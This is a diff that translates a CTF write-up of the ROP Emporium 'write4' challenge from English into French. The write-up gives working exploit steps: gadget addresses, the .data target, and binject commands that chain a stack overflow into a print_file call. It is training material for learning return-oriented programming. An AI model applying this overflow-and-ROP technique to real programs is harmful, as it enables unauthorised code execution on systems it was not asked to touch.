@@ -2,33 +2,27 @@
 
 https://ropemporium.com/challenge/write4.html
 
-## Blind test
-
-We really sought to understand it without any help other than that provided... But it was hard !
-
 > wget https://ropemporium.com/binary/write4.zip <br>
 > unzip write4.zip <br>
 > checksec write4 <br>
 > strings write4 <br>
 
-Nothing really relevant from thoses commands, there is literally no strings to exploit on this. Going to **gdb** must necessarily provide us with more information:
+Rien de très utile ne peut être tiré de ces commandes, il n'y a littéralment aucune chaine à exploiter dans cet exécutable, comme précisé dans l'énoncé. Peut-être qu'avec **gdb** nous obtiendrons plus d'informations:
 
 > gdb write4 <br>
 > info func <br>
 
-There is our pwnme being dynamically linked through *PLT* mechanism as we digged into on previous *callme* challenge. It means that getting assembly code from `disas` both **pwnme@plt** and new **print_file@plt** would just show us thoses assembly instructions from *.plt* section that is in charge to resolve the symbol onto *.got.plt*. 
+Nous remarquons toujours notre fonction contenant le buffer vulnérable `pwnme`, *externe* et résolue par **PLT** comme dans le challenge précédent. Il y aussi la fonction *externe* cible `print_file`.
 
-There is also the **usefulFunction** with its **print_file@plt** call; the only argument get load to %rdi register from *0x4006b4*.
+Au niveau des fonctions *interne*, on repère `usefulFunction` et son appel à `print_file@plt` avec son unique argument qui est chargé dans le registre `%rdi` depuis l'addresse *0x4006b4*. Avec **gdb**:
 > x/s 0x4006b4 <br>
 > 0x4006b4: "nonexistent"
 
-In fact, we shall haved use the:
-> rabin2 -z write4  
+En utilisant **rabin2**:
+> rabin2 -z write4 <br>
+> rabin2 -S write4
 
-Rabin2 can also give us much more information than gdb about sections:
-> rabin2 -S write4 <br>
-
-We can locate our last argument for **print_file@plt** onto the *.rodata*, that have read-only permission. As suggested on the challenge, we shall rather use the *.data* section that is have read and write permissions.
+Nous pouvons localiser l'argument passé à la fonction `print_file@plt` par `usefulFunction` dans la section **.rodata**; L'utilisation de **rabin2** nous permet d'identifier les permissions associés à chacunes des sections (même si c'est toujours les mêmes..), et cette dernière est *read-only*. Comme suggéré dans le challenge, nous devrions plutôt utiliser une section sur laquelle le programme peut écrire; nous utiliserons donc la section **.data** qui a les permissions pour lire et écrire.
 > rabin2 -S write4 <br>
 > [Sections] <br>
 > <br>
@@ -38,40 +32,38 @@ We can locate our last argument for **print_file@plt** onto the *.rodata*, that 
 
 ## Inspecteur gadget
 
-On other side, we have the usefulGadgets, that is nothing more than some instructions for `mov` instruction that take whatever is in %r15 to the location from %r14:
+D'un autre côté, nous avons la fonction `usefulGadgets`, qui ne contient rien d'autre que l'instruction `mov` pour copier le contenu du registre `%r15` à l'addresse contenue dans `%r14`:
 > 0x0000000000400628 <+0>:&emsp;mov %r15,(%r14)
 
-This would be our ROP gadget, but not the only one ! As for *callme* challenge, we need some gadget to pop values from stack to thoses specifics registers. Using ropper we identified exactly what we need:
+Cela sera notre ROP gadget, mais pas l'unique ! Comme pour le challenge **callme**, nous aurons besoin d'un gadget pour `pop`er les valeurs à charger dans les registres `%r14` et `%r15`. En utilisant **ropper**:
 > ropper --file write4 --search "pop" <br>
-> 0x0000000000400690:&emsp;pop r14; pop r15; ret;
+> 0x0000000000400690:&emsp;pop r14; pop r15; ret; <br>
 > 0x0000000000400693:&emsp;pop rdi; ret;
 
-We also identified one gadget to pop stack element to %rdi register, that will be our way to call **print_file@plt**, as we did with *callme* challenge.
+Il existe d'ailleur au autre gadget pour `pop` une valeur dans le registre `%rdi`, par convention le premier paramètre d'appel de fonction. 
 
+## La solution
 
-## The solution
-
-We will use the exact same solution as from *callme* challenge, namely by using different files generated with binject:
-1. To overflow (it is still the same as for *callme* challenge):
+En nous basant sur la solution proposée pour le challenge **callme**:
+1. Le binaire pour l'overflow (40 bytes pour atteindre la *return address* dans la stack, comme d'habitude):
 > binject -of ovf.bin -ns 40 A
 
-2. To get r14 and r15 values from stack with `pop` gadget:
+2. Le `pop` gadget, pour charger l'addresse de **.data** dans `%r14`, et la chaîne de caractère pour le paramètre, dans `%r15`:
 > binject -of flg.bin -x64 400690 -x64 601028 -s flag.txt
 
-3. To write content from r15 to r14 location with `mov` gadget:
+3. Le `mov` gadget pour charger le contenu de `%r15` à l'addresse contenue par `r%14`:
 > binject -of mem.bin -if flg.bin -x64 400628
 
-4. To load parameter from memory on rdi:
+4. Le `pop` gadget pour charger l'addresse de **.data** dans `%rdi`:
 > binject -of prm.bin -x64 400693 -x64 601028
 
-5. To call the function:
+5. L'appel de la fonction `print_file` (dans la section **.plt** puisque pas encore résolue):
 > binject -of cll.bin -if prm.bin -x64 400510
 
-6. Put it all together:
+6. On assemble le tout:
 > binject -of ola.bin -if ovf.bin -if mem.bin -if cll.bin
 
-Here we go:
-
+Et on est bon:
 > Thank you! <br>
 > ROPE{a_placeholder_32byte_flag!} <br>
 > Segmentation fault
